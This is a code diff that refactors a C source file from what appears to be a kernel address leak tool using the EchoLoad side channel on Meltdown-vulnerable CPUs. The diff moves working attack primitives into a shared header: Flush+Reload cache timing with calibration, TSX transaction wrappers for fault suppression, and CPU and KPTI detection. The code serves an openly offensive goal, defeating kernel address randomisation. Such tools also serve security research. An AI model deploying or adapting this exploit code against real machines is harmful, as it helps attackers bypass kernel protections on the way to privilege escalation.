@@ -57,17 +57,12 @@
 #define _GNU_SOURCE
 #include "include/kasld.h"
 #include "include/kasld_internal.h"
-#include <cpuid.h>
+#include "include/sidechannel.h"
 #include <memory.h>
-#include <sched.h>
 #include <setjmp.h>
 #include <signal.h>
-#include <stdbool.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
 
 /* =========================================================================
  * Configuration
@@ -122,77 +117,6 @@ KASLD_META("method:timing\n"
            "hardware:Meltdown-vulnerable CPU required\n");
 
 /* =========================================================================
- * Timing primitives (x86_64 only)
- *
- * Based on cacheutils.h by Daniel Gruss and Michael Schwarz (IAIK,
- * TU Graz / isec-tugraz). Original primitives (rdtsc, flush, reload):
- *   https://github.com/isec-tugraz/prefetch (Gruss, 2015)
- * Extended with TSX and signal-based fault suppression:
- *   https://github.com/isec-tugraz/ZombieLoad (Schwarz)
- * Used in the EchoLoad / Data Bounce reference implementation:
- *   https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
- * =========================================================================
- */
-
-static size_t cache_miss_threshold;
-
-static inline uint64_t rdtscp_time(void) {
-  uint64_t lo, hi;
-  __asm__ volatile("mfence\n\t"
-                   "rdtscp\n\t"
-                   "mov %%rax, %0\n\t"
-                   "mov %%rdx, %1\n\t"
-                   "mfence"
-                   : "=r"(lo), "=r"(hi)
-                   :
-                   : "rax", "rcx", "rdx");
-  return (hi << 32) | lo;
-}
-
-static inline void maccess(volatile void *p) {
-  __asm__ volatile("movq (%0), %%rax" : : "c"(p) : "rax");
-}
-
-static inline void flush(volatile void *p) {
-  __asm__ volatile("clflush 0(%0)" : : "c"(p) : "rax");
-}
-
-static int flush_reload(volatile void *ptr) {
-  uint64_t start, end;
-  start = rdtscp_time();
-  maccess(ptr);
-  end = rdtscp_time();
-  flush(ptr);
-  return (end - start) < cache_miss_threshold;
-}
-
-static size_t detect_flush_reload_threshold(void) {
-  size_t reload_time = 0, flush_reload_time = 0;
-  const size_t count = 1000000;
-  size_t dummy[16];
-  volatile size_t *ptr = dummy + 8;
-
-  maccess((volatile void *)ptr);
-  for (size_t i = 0; i < count; i++) {
-    uint64_t s = rdtscp_time();
-    maccess((volatile void *)ptr);
-    uint64_t e = rdtscp_time();
-    reload_time += (size_t)(e - s);
-  }
-  for (size_t i = 0; i < count; i++) {
-    flush((volatile void *)ptr);
-    uint64_t s = rdtscp_time();
-    maccess((volatile void *)ptr);
-    uint64_t e = rdtscp_time();
-    flush_reload_time += (size_t)(e - s);
-  }
-  reload_time /= count;
-  flush_reload_time /= count;
-
-  return (flush_reload_time + reload_time * 2) / 3;
-}
-
-/* =========================================================================
  * Fault suppression
  * =========================================================================
  */
@@ -209,29 +133,6 @@ static void segfault_handler(int signum) {
   longjmp(trycatch_buf, 1);
 }
 
-/* --- TSX (RTM) --- */
-static int has_rtm(void) {
-  unsigned int eax, ebx, ecx, edx;
-  if (__get_cpuid_max(0, NULL) >= 7) {
-    __cpuid_count(7, 0, eax, ebx, ecx, edx);
-    return (ebx >> 11) & 1;
-  }
-  return 0;
-}
-
-static inline unsigned int xbegin_wrapper(void) {
-  unsigned int status;
-  __asm__ volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
-                   : "=a"(status)
-                   : "a"(-1UL)
-                   : "memory");
-  return status;
-}
-
-static inline void xend_wrapper(void) {
-  __asm__ volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
-}
-
 /* --- Speculation (ret-to-call mispredict) --- */
 #if ECHOLOAD_USE_SPECULATION
 #define speculation_start(label) __asm__ goto("call %l0" : : : : label##_retp)
@@ -246,49 +147,6 @@ static inline void xend_wrapper(void) {
   label:                                                                       \
   __asm__ volatile("nop")
 #endif
-
-/* =========================================================================
- * CPU detection
- * =========================================================================
- */
-
-static bool is_intel_cpu(void) {
-  unsigned int eax, ebx, ecx, edx;
-  __asm__ volatile("cpuid"
-                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
-                   : "a"(0)
-                   :);
-  /* "GenuineIntel" = EBX:EDX:ECX */
-  return ebx == 0x756e6547 && edx == 0x49656e69 && ecx == 0x6c65746e;
-}
-
-static bool detect_kpti(void) {
-  FILE *f = fopen("/proc/cpuinfo", "r");
-  if (!f)
-    return false;
-
-  char *line = NULL;
-  size_t len = 0;
-  bool pti = false;
-  while (getline(&line, &len, f) != -1) {
-    if (strstr(line, "flags") == NULL)
-      continue;
-    if (strstr(line, " pti") != NULL) {
-      pti = true;
-      break;
-    }
-  }
-  free(line);
-  fclose(f);
-  return pti;
-}
-
-/* =========================================================================
- * Probe array (Flush+Reload target)
- * =========================================================================
- */
-
-static char __attribute__((aligned(4096))) probe[4096 * 256];
 
 /* =========================================================================
  * EchoLoad single sweep
@@ -409,10 +267,7 @@ int main(void) {
           cache_miss_threshold);
 
   /* Pin to a single core to reduce noise */
-  cpu_set_t set;
-  CPU_ZERO(&set);
-  CPU_SET(1, &set);
-  sched_setaffinity(0, sizeof(set), &set);
+  pin_cpu(1);
 
   unsigned long addr = echoload_sweep(use_tsx);
 
